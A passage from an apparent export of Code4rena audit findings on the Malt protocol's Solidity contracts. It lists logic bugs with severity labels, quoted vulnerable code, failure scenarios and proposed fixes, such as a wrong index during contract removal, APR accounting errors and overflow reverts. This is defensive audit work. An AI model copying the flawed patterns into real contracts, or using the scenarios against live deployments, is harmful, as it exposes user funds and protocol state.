"https://github.com/code-423n4/2023-02-malt-findings/issues/32", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L163   # Vulnerability details  ## Impact `StabilizerNode.stabilize()` should update `lastTracking` as well to avoid an unnecessary incentive.  Current logic pays unnecessary incentives to track the pool.  ## Proof of Concept `trackPool()` pays an incentive per `trackingBackoff` in order to ensure pool consistency.  ```solidity File: 2023-02-malt\\contracts\\StabilityPod\\StabilizerNode.sol 248:   function trackPool() external onlyActive { 249:     require(block.timestamp >= lastTracking + trackingBackoff, \"Too early\"); //@audit lastTracking should be updated in stabilize() also 250:     bool success = maltDataLab.trackPool(); 251:     require(success, \"Too early\"); 252:     malt.mint(msg.sender, (trackingIncentive * (10**malt.decimals())) / 100); // div 100 because units are cents 253:     lastTracking = block.timestamp; 254:     emit Tracking(); 255:   } ```  And `stabilize()` tracks the pool as well and we don't need to pay an incentive unnecessarily in `trackPool()` if `stabilize()` was called recently.  For that, we can update `lastTracking` in `stabilize()`.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend updating `lastTracking` in `stabilize()`.  ```solidity   function stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {     // Ensure data consistency     maltDataLab.trackPool();     lastTracking = block.timestamp; //++++++++++++++++      ... ```"}, {"title": "Average `APR`s might be calculated wrongly after calling `populateFromPreviousThrottle()`.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/30", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L660 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L139   # Vulnerability details  ## Impact Average `APR`s might be calculated wrongly after calling `populateFromPreviousThrottle()` and `targetAPR` might be changed unexpectedly.  ## Proof of Concept The epoch state struct contains `cumulativeCashflowApr` element and `cashflowAverageApr` is used to adjust `targetAPR` in `updateDesiredAPR()` function.  And `populateFromPreviousThrottle()` is an admin function to change `activeEpoch` and the relevant epoch state using the previous throttle.  And the `activeEpoch` is likely to be increased inside this function.  ```solidity   function populateFromPreviousThrottle(address previousThrottle, uint256 epoch)     external     onlyRoleMalt(ADMIN_ROLE, \"Only admin role\")   {     RewardThrottle previous = RewardThrottle(previousThrottle);     uint256 _activeEpoch = activeEpoch; // gas      for (uint256 i = _activeEpoch; i < epoch; ++i) {       (         uint256 profit,         uint256 rewarded,         uint256 bondedValue,         uint256 desiredAPR,         uint256 epochsPerYear,         uint256 cumulativeCashflowApr,         uint256 cumulativeApr       ) = previous.epochData(i);        state[i].bondedValue = bondedValue;       state[i].profit = profit;       state[i].rewarded = rewarded;       state[i].epochsPerYear = epochsPerYear;       state[i].desiredAPR = desiredAPR;       state[i].cumulativeCashflowApr = cumulativeCashflowApr;       state[i].cumulativeApr = cumulativeApr;     }      activeEpoch = epoch;   } ```  The problem might occur when `epoch < _activeEpoch + smoothingPeriod` because `state[epoch].cumulativeCashflowApr`and `state[epoch - smoothingPeriod].cumulativeCashflowApr` will be used for `cashflowAverageApr` calculation.  So `cumulativeCashflowApr` of the original epoch and the newly added epoch will be used together and `cashflowAverageApr` might be calculated wrongly.  As a result, `targetAPR` might be changed unexpectedly.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend checking `epoch - _activeEpoch > smoothingPeriod` in `populateFromPreviousThrottle()`."}, {"title": "`RewardThrottle._sendToDistributor()` reverts if one distributor is inactive.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/29", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L602 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L101   # Vulnerability details  ## Impact `RewardThrottle._sendToDistributor()` reverts if one distributor is inactive.  ## Proof of Concept `RewardThrottle._sendToDistributor()` distributes the rewards to several distributors according to their allocation ratios.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol 575:   function _sendToDistributor(uint256 amount, uint256 epoch) internal { 576:     if (amount == 0) { 577:       return; 578:     } 579:  580:     ( 581:       uint256[] memory poolIds, 582:       uint256[] memory allocations, 583:       address[] memory distributors 584:     ) = bonding.poolAllocations(); 585:  586:     uint256 length = poolIds.length;ratio 587:     uint256 balance = collateralToken.balanceOf(address(this)); 588:     uint256 rewarded; 589:  590:     for (uint256 i; i < length; ++i) { 591:       uint256 share = (amount * allocations[i]) / 1e18; 592:  593:       if (share == 0) { 594:         continue; 595:       } 596:  597:       if (share > balance) { 598:         share = balance; 599:       } 600:  601:       collateralToken.safeTransfer(distributors[i], share); 602:       IDistributor(distributors[i]).declareReward(share); //@audit will revert if one distributor is inactive ```  And `LinearDistributor.declareReward()` has an `onlyActive` modifier and it will revert in case of `inactive`.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\LinearDistributor.sol 098:   function declareReward(uint256 amount) 099:     external 100:     onlyRoleMalt(REWARDER_ROLE, \"Only rewarder role\") 101:     onlyActive 102:   { ```  As a result, `RewardThrottle._sendToDistributor()` will revert if one distributor is inactive rather than working with active distributors only.  ## Tools Used Manual Review  ## Recommended Mitigation Steps I think it's logical to continue to work with active distributors in `_sendToDistributor()`."}, {"title": "`LinearDistributor.declareReward()` might revert after changing `vestingDistributor`.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/28", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L114 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L227   # Vulnerability details  ## Impact `LinearDistributor.declareReward()` might revert after changing `vestingDistributor` due to uint underflow.  ## Proof of Concept In `LinearDistributor.sol`, there is a [setVestingDistributor()](https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L222-L228) function to update `vestingDistributor`.  And in `declareReward()`, it calculates the `netVest` and `netTime` by subtracting the previous amount and time.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\LinearDistributor.sol 112:     uint256 currentlyVested = vestingDistributor.getCurrentlyVested(); 113:  114:     uint256 netVest = currentlyVested - previouslyVested; //@audit revert after change vestingDistributor 115:     uint256 netTime = block.timestamp - previouslyVestedTimestamp; 116:  ```  But there is no guarantee that the vested amount of the new `vestingDistributor` is greater than the previously saved amount after changing the distributor.  Furthermore, there is no option to change `previouslyVested` beside this declareReward() function and it will keep reverting unless the admin change back the distributor.  ## Tools Used Manual Review  ## Recommended Mitigation Steps I think it would resolve the above problem if we change the previous amounts as well while updating the distributor.  ```solidity   function setVestingDistributor(address _vestingDistributor, uint _previouslyVested, uint _previouslyVestedTimestamp)     external     onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\")   {     require(_vestingDistributor != address(0), \"SetVestDist: No addr(0)\");     vestingDistributor = IVestingDistributor(_vestingDistributor);      previouslyVested = _previouslyVested;     previouslyVestedTimestamp = _previouslyVestedTimestamp;   } ```"}, {"title": "`MaltDataLab.getActualPriceTarget()` reverts when `breakpointBps = 10000`.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/27", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/DataFeed/MaltDataLab.sol#L448-L460 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/DataFeed/MaltDataLab.sol#L602-L612   # Vulnerability details  ## Impact `MaltDataLab.getActualPriceTarget()` reverts when `breakpointBps = 10000`.  ## Proof of Concept In `setBreakpointBps()`, it's possible `breakpointBps = 10000`.  ```solidity File: 2023-02-malt\\contracts\\DataFeed\\MaltDataLab.sol 602:   function setBreakpointBps(uint256 _breakpointBps) 603:     external 604:     onlyRoleMalt(ADMIN_ROLE, \"Must have admin role\") 605:   { 606:     require(_breakpointBps != 0, \"Cannot have 0 breakpoint BPS\"); 607:     require( 608:       _breakpointBps <= 10000, 609:       \"Cannot have a breakpoint BPS greater than 10,000\" 610:     ); 611:     breakpointBps = _breakpointBps; 612:   } ```  And in `getActualPriceTarget`, it calculates `m` like the below.  ```solidity File: 2023-02-malt\\contracts\\DataFeed\\MaltDataLab.sol 449:     int128 breakpointInt = ABDKMath64x64.div( //@audit-info purchaseParityInt * breakpointBps / 10000 450:       ABDKMath64x64.mul( 451:         purchaseParityInt, 452:         ABDKMath64x64.fromUInt(breakpointBps) 453:       ), 454:       ABDKMath64x64.fromUInt(10000) 455:     ); 456:     int128 oneInt = ABDKMath64x64.fromUInt(1); 457:  458:     int128 m = (icTotalInt.sub(oneInt)).div( //@audit-info (icTotalInt - 1) / (purchaseParityInt - breakpointInt) 459:       purchaseParityInt.sub(breakpointInt) //@audit revert when breakpointBps = 10000 460:     ); ```  As we can see from the comments, `purchaseParityInt = breakpointInt` when `breakpointBps = 10000` and the `ABDKMath64x64` library reverts on zero division [here](https://github.com/code-423n4/2023-02-malt/blob/main/contracts/libraries/ABDKMath64x64.sol#L239).  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend setting `breakpointBps < 10000` always in `setBreakpointBps()` function."}, {"title": "`Repository._updateContract()` should check if `_name` has a non-zero trader contract already.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/26", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/Repository.sol#L236-L242   # Vulnerability details  ## Impact `Repository._updateContract()` is used to change the contract name.  But if this function is called using the `_name` that doesn't have a trader contract yet, the `_name` will have a valid contract without adding to `contracts` array.  ## Proof of Concept `Repository._updateContract()` changes the contract for `_name`.  ```solidity File: 2023-02-malt\\contracts\\Repository.sol 236:   function _updateContract(string memory _name, address _newContract) internal { //@audit should check if _name has a contract address already 237:     require(_newContract != address(0), \"0x0\"); 238:     bytes32 hashedName = keccak256(abi.encodePacked(_name)); 239:     Contract storage currentContract = globalContracts[hashedName]; 240:     currentContract.contractAddress = _newContract; 241:     emit UpdateContract(hashedName, _newContract); 242:   } ```  But it doesn't check if `_name` has a non-zero contract already and it will work unexpectedly if the function is called with a new `_name` param.  In this case, the `_name` will have a valid contract but the contract won't be added to `contracts` array.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should revert if `_name` doesn't have a valid contract.  ```solidity   function _updateContract(string memory _name, address _newContract) internal {     require(_newContract != address(0), \"0x0\");     bytes32 hashedName = keccak256(abi.encodePacked(_name));     Contract storage currentContract = globalContracts[hashedName];      require(currentContract.contractAddress != address(0), \"Invalid name\"); //++++++++++++++++++      currentContract.contractAddress = _newContract;     emit UpdateContract(hashedName, _newContract);   } ```"}, {"title": "`Repository._removeContract()` removes the contract wrongly.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/25", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/Repository.sol#L229   # Vulnerability details  ## Impact After removing the contract, the `contracts` array would contain the wrong contract names.  ## Proof of Concept `Repository._removeContract()` removes the contract name from `contracts` array.  ```solidity File: 2023-02-malt\\contracts\\Repository.sol 223:   function _removeContract(string memory _name) internal { 224:     bytes32 hashedName = keccak256(abi.encodePacked(_name)); 225:     Contract storage currentContract = globalContracts[hashedName]; 226:     currentContract.contractAddress = address(0); 227:     currentContract.index = 0; 228:  229:     uint256 index = currentContract.index; //@audit wrong index 230:     string memory lastContract = contracts[contracts.length - 1]; 231:     contracts[index] = lastContract; 232:     contracts.pop(); 233:     emit RemoveContract(hashedName); 234:   } ```  But it uses the already changed index(= 0) and replaces the last name with 0 index all the time.  As a result, the contracts array will still contain the removed name and remove the valid name at index 0.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should use the original index like below.  ```solidity   function _removeContract(string memory _name) internal {     bytes32 hashedName = keccak256(abi.encodePacked(_name));     Contract storage currentContract = globalContracts[hashedName];      uint256 index = currentContract.index; //++++++++++++++      currentContract.contractAddress = address(0);     currentContract.index = 0;      string memory lastContract = contracts[contracts.length - 1];     contracts[index] = lastContract;     contracts.pop();     emit RemoveContract(hashedName);   } ```"}, {"title": "`GlobalImpliedCollateralService.setPoolUpdater()` works wrongly when `_updater == oldUpdater`.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/24", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/GlobalImpliedCollateralService.sol#L116   # Vulnerability details  ## Impact `GlobalImpliedCollateralService.setPoolUpdater()` removes the updater when `_updater == oldUpdater`.  ## Proof of Concept `GlobalImpliedCollateralService.setPoolUpdater()` is used to set or update the pool updaters.  ```solidity   function setPoolUpdater(address _pool, address _updater)     external     onlyRoleMalt(UPDATER_MANAGER_ROLE, \"Must have updater manager role\")   {     require(_updater != address(0), \"GlobImpCol: No addr(0)\");     poolUpdaters[_updater] = _pool;     address oldUpdater = poolUpdatersLookup[_pool];     emit SetPoolUpdater(_pool, _updater);     poolUpdaters[oldUpdater] = address(0); //@audit doesn't work when _update = oldUpdater     poolUpdatersLookup[_pool] = _updater;   } ```  But it removes the `oldUpdater` after setting the new updater so it will reset `poolUpdaters[_updater]` when `_updater == oldUpdater`.  As a result, the original updater won't have a relevant role.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend checking `_update != oldUpdater`.  ```solidity   function setPoolUpdater(address _pool, address _updater)     external     onlyRoleMalt(UPDATER_MANAGER_ROLE, \"Must have updater manager role\")   {     require(_updater != address(0), \"GlobImpCol: No addr(0)\");     poolUpdaters[_updater] = _pool;     address oldUpdater = poolUpdatersLookup[_pool];      require(_updater != oldUpdater, \"Same updater\"); //+++++++++++++++++++      emit SetPoolUpdater(_pool, _updater);     poolUpdaters[oldUpdater] = address(0);     poolUpdatersLookup[_pool] = _updater;   } ```"}, {"title": "`RewardThrottle.checkRewardUnderflow()` might track the cumulative `APR`s wrongly.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/23", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L445-L455 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L576   # Vulnerability details  ## Impact `RewardThrottle.checkRewardUnderflow()` might calculate the cumulative `APR`s for epochs wrongly.  As a result, `cashflowAverageApr` will be calculated incorrectly in `updateDesiredAPR()`, and `targetAPR` would be changed unexpectedly.  ## Proof of Concept In `checkRewardUnderflow()`, it calls a `_sendToDistributor()` function to update cumulative `APR`s after requesting some capitals from the overflow pool.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol 445:     if (epoch > _activeEpoch) { 446:       for (uint256 i = _activeEpoch; i < epoch; ++i) { 447:         uint256 underflow = _getRewardUnderflow(i); 448:  449:         if (underflow > 0) { 450:           uint256 balance = overflowPool.requestCapital(underflow); 451:  452:           _sendToDistributor(balance, i);  //@audit cumulative apr will be tracked wrongly when epoch > _activeEpoch + 1 453:         } 454:       } 455:     } ```  The main reason for this issue is that `_sendToDistributor()` doesn't update the cumulative `APR`s when `amount == 0` and the below scenario would be possible.  1. Let's assume `activeEpoch = 100` and `epoch = 103`. It's possible if the active epoch wasn't updated for 2 epochs. 2. After that, the `checkRewardUnderflow()` function will call `_fillInEpochGaps()` and the cumulative `APR`s will be settled accordingly. 3. And it will try to request capitals from the `overflowPool` and increase the rewards for epochs. 4. At epoch 100, it requests some positive `balance` from `overflowPool` and increases the cumulative `APR`s for epoch 101 correctly in `_sendToDistributor()`.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol 611:     state[epoch].rewarded = state[epoch].rewarded + rewarded; 612:     state[epoch + 1].cumulativeCashflowApr =  613:       state[epoch].cumulativeCashflowApr + 614:       epochCashflowAPR(epoch); 615:     state[epoch + 1].cumulativeApr =  616:       state[epoch].cumulativeApr + 617:       epochAPR(epoch); 618:     state[epoch].bondedValue = bonding.averageBondedValue(epoch); ``` 5. After that, the `overflowPool` doesn't have any remaining funds and the `balance(At L450)` will be 0 for epochs 101, 102. 6. So `_sendToDistributor()` will be terminated right away and won't increase the cumulative `APR`s of epoch 102 according to epoch 101 and this value won't be changed anymore because the `activeEpoch` is 103 already.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol 575:   function _sendToDistributor(uint256 amount, uint256 epoch) internal {  576:     if (amount == 0) { 577:       return; 578:     } ```  As a result, the cumulative `APR`s will save smaller values from epoch 102 and `cashflowAverageApr` will be smaller also if the `smoothingPeriod` contains such epochs in `updateDesiredAPR()`.  ```solidity File: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol 139:     uint256 cashflowAverageApr = averageCashflowAPR(smoothingPeriod); ```  So the `updateDesiredAPR()` function will change the `targetAPR` using the smaller average value and the smoothing logic wouldn't work as expected.  ## Tools Used Manual Review  ## Recommended Mitigation Steps I think `_sendToDistributor()` should update the cumulative `APR`s as well when `amount == 0`.  ```solidity   function _sendToDistributor(uint256 amount, uint256 epoch) internal {     if (amount == 0) {         state[epoch + 1].cumulativeCashflowApr = state[epoch].cumulativeCashflowApr + epochCashflowAPR(epoch);         state[epoch + 1].cumulativeApr = state[epoch].cumulativeApr + epochAPR(epoch);         state[epoch].bondedValue = bonding.averageBondedValue(epoch);          return;     } ```"}, {"title": "RewardThrottle.setTimekeeper: If changing the timekeeper causes the epoch to change, it will mess up the system", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L690-L696   # Vulnerability details  ## Impact RewardThrottle.setTimekeeper allows POOL_UPDATER_ROLE to update the timekeeper when RewardThrottle is active,  ```solidity   function setTimekeeper(address _timekeeper)     external     onlyRoleMalt(POOL_UPDATER_ROLE, \"Must have pool updater privs\")   {     require(_timekeeper != address(0), \"Not address 0\");     timekeeper = ITimekeeper(_timekeeper);   } ``` if newTimekeeper.epoch changes, it will cause the following 1. The newTimekeeper.epoch increases, and the user can immediately call checkRewardUnderflow to fill the gap epoch, thereby distributing a large amount of rewards. 2. The newTimekeeper.epoch decreases, and the contract will use the state of the previous epoch. Since the state.rewarded has reached the upper limit, this will cause the current epoch to be unable to receive rewards. ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L690-L696 ## Tools Used None ## Recommended Mitigation Steps Consider only allowing setTimekeeper to be called when RewardThrottle is not active"}, {"title": "RewardThrottle: If an epoch does not have any profit, then there may not be rewards for that epoch at the start of the next epoch.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/20", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L437-L462   # Vulnerability details  ## Impact In RewardThrottle, both checkRewardUnderflow and fillInEpochGaps call _fillInEpochGaps to fill the state of the previous epoch without profit, the difference being that checkRewardUnderflow will request the reward from the overflowPool and distribute the reward, whereas fillInEpochGaps does not. ```solidity   function checkRewardUnderflow() public onlyActive {     uint256 epoch = timekeeper.epoch();      uint256 _activeEpoch = activeEpoch; // gas      // Fill in gaps so we have a fresh foundation to calculate from     _fillInEpochGaps(epoch);      if (epoch > _activeEpoch) {       for (uint256 i = _activeEpoch; i < epoch; ++i) {         uint256 underflow = _getRewardUnderflow(i);          if (underflow > 0) {           uint256 balance = overflowPool.requestCapital(underflow);            _sendToDistributor(balance, i);         }       }     }   }    function fillInEpochGaps() external {     uint256 epoch = timekeeper.epoch();      _fillInEpochGaps(epoch);   } ``` This results in that when an epoch does not have any profit, then at the start of the next epoch that epoch will have a reward if checkRewardUnderflow is called, and no reward if fillInEpochGaps is called. According to the documentation, when an epoch is not profitable enough, the reward should be requested from the overflowPool, so checkRewardUnderflow should be called. And if fillInEpochGaps is called first, the epoch will lose its reward.  Note: populateFromPreviousThrottle will also cause epochs without any profit to lose their rewards ```solidity   function populateFromPreviousThrottle(address previousThrottle, uint256 epoch)     external     onlyRoleMalt(ADMIN_ROLE, \"Only admin role\")   {     RewardThrottle previous = RewardThrottle(previousThrottle);     uint256 _activeEpoch = activeEpoch; // gas      for (uint256 i = _activeEpoch; i < epoch; ++i) {       (         uint256 profit,         uint256 rewarded,         uint256 bondedValue,         uint256 desiredAPR,         uint256 epochsPerYear,         uint256 cumulativeCashflowApr,         uint256 cumulativeApr       ) = previous.epochData(i);        state[i].bondedValue = bondedValue;       state[i].profit = profit;       state[i].rewarded = rewarded;       state[i].epochsPerYear = epochsPerYear;       state[i].desiredAPR = desiredAPR;       state[i].cumulativeCashflowApr = cumulativeCashflowApr;       state[i].cumulativeApr = cumulativeApr;     }      activeEpoch = epoch;   } ``` ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L437-L462 ## Tools Used None ## Recommended Mitigation Steps Consider removing the fillInEpochGaps function, or only allowing it to be called when the contract is not active"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-02"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/cccz-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-03"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/minhquanym-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/17", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/minhquanym-Q.md)."}, {"title": "Value of `totalProfit` might be wrong because of wrong logic in function `sellMalt()`", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-12"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L252-L256   # Vulnerability details  ## Impact Contract `SwingTraderManager` has a `totalProfit` variable. It keeps track of total profit swing traders maded during `sellMalt()`. However, the logic for accounting it is wrong so it will not have the correct value. As the results, it can affect other contracts that integrating with `SwingTraderManager` and use this `totalProfit` variable.  ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L252-L258  ```solidity if (amountSold + dustThreshold >= maxAmount) {   return maxAmount; }  totalProfit += profit;  // @audit did not update because already return above  emit SellMalt(amountSold, profit); ```  Function `sellMalt()` has a dust check before returning result. `totalProfit` should be updated before this check as it return the value immediately without updating `totalProfit`.   ## Tools Used Manual Review  ## Recommended Mitigation Steps Updating `totalProfit` before the dust check in function `sellMalt()`. "}, {"title": "Function `stabilize()` might always revert because of overflow since Malt contract use solidity 0.8", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/15", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-13"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L161 https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/DataFeed/MaltDataLab.sol#L326   # Vulnerability details  ## Impact MaltDataLab fetched `priceCumulative` directly from Uniswap V2 pool to calculate price of Malt token. However, it is noticed that Uniswap V2 pool use Solidity 0.5.16, which does not revert when overflow happen. In addition, it is actually commented in Uniswap code that  > * never overflows, and + overflow is desired  https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L77-L81 ```solidity if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {     // * never overflows, and + overflow is desired     price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;     price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed; } ```  However, MaltDataLab contracts use Solidity 0.8 and will revert when overflow. It will break the `stabilize()` function and always revert since `stabilize()` call to MaltDataLab contract to get state.  Please note that, with Solidity 0.5.16, when result of addition bigger than `max(uint256)`, it will overflow without any errors. For example, `max(uint256) + 2 = 1`.   So when `price0CumulativeLast` is overflow, the new value of `price0CumulativeLast` will smaller than old value. As the result, when MaltDataLab doing a subtraction to calculate current price, it might get revert.  ## Proof of Concept Function `stabilize()` will call to `MaltDataLab.trackPool()` first https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L163  ```solidity function stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {     // Ensure data consistency     maltDataLab.trackPool();     ... } ```  Function `trackPool()` used a formula that will revert when `priceCumulative` overflow in Uniswap pool. https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/DataFeed/MaltDataLab.sol#L323-L329  ```solidity price = FixedPoint     .uq112x112(       uint224(           // @audit might overflow with solidity 0.8.0         (priceCumulative - maltPriceCumulativeLast) /            (blockTimestampLast - maltPriceTimestampLast)       )     ) ```  Scenario: 1. `maltPriceCumulativeLast = max(uint256 - 10)` and `price = 10, timeElapsed = 10`. So the new `priceCumulative = max(uint256 - 10) + 10 * 10 = 99 (overflow)`  2. When doing calculation in Malt protocol, `priceCumulative < maltPriceCumulativeLast`, so `priceCumulative - maltPriceCumulativeLast` will revert and fail  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider using `unchecked` block to match handle overflow calculation in Uniswap V2. "}, {"title": "SwingTraderManager.addSwingTrader will push traderId with active = false to activeTraders", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/12", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-04"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L397-L447   # Vulnerability details  ## Impact In SwingTraderManager.addSwingTrader, if active = false, the traderId is also pushed to activeTraders. ```solidity   function addSwingTrader(     uint256 traderId,     address _swingTrader,     bool active,     string calldata name   ) external onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\") {     SwingTraderData storage trader = swingTraders[traderId];     require(traderId > 2 && trader.id == 0, \"TraderId already used\");     require(_swingTrader != address(0), \"addr(0)\");      swingTraders[traderId] = SwingTraderData({       id: traderId,       index: activeTraders.length,       traderContract: _swingTrader,       name: name,       active: active     });      activeTraders.push(traderId);      emit AddSwingTrader(traderId, name, active, _swingTrader);   } ``` Afterwards, if toggleTraderActive is called on the traderId, the traderId will be pushed to activeTraders again. ```solidity   function toggleTraderActive(uint256 traderId)     external     onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\")   {     SwingTraderData storage trader = swingTraders[traderId];     require(trader.id == traderId, \"Unknown trader\");      bool active = !trader.active;     trader.active = active;      if (active) {       // setting it to active so add to activeTraders       trader.index = activeTraders.length;       activeTraders.push(traderId);     } else { ``` This means that in getTokenBalances()/calculateSwingTraderMaltRatio(), since there are two identical traderIds in activeTraders, the data in this trader will be calculated twice. Wrong getTokenBalances() will result in wrong data when syncGlobalCollateral().  ```solidity   function getTokenBalances()     external     view     returns (uint256 maltBalance, uint256 collateralBalance)   {     uint256[] memory traderIds = activeTraders;     uint256 length = traderIds.length;      for (uint256 i; i < length; ++i) {       SwingTraderData memory trader = 